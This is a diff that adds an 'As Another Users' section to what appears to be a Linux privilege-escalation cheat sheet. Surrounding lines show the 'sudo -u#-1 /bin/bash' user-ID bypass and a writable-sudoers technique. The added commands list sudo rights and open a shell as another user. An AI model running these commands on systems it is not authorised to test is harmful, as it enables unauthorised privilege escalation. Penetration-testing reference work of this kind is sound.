@@ -270,6 +270,15 @@ sudo -u#-1 /bin/bash
 ```
 > - [HackTricks: Sudo Version](https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-version)
 
+### As Another Users
+```bash
+# List privileges for the current user
+sudo -l
+
+# If the output shows `(user:user) NOPASSWD: ALL`, execute a command as 'testuser'
+sudo -u testuser /bin/bash
+```
+
 ### Edit Sudoers
 ```bash
 # If writable permissons are set on /etc/sudoers or /etc/sudoers.d,
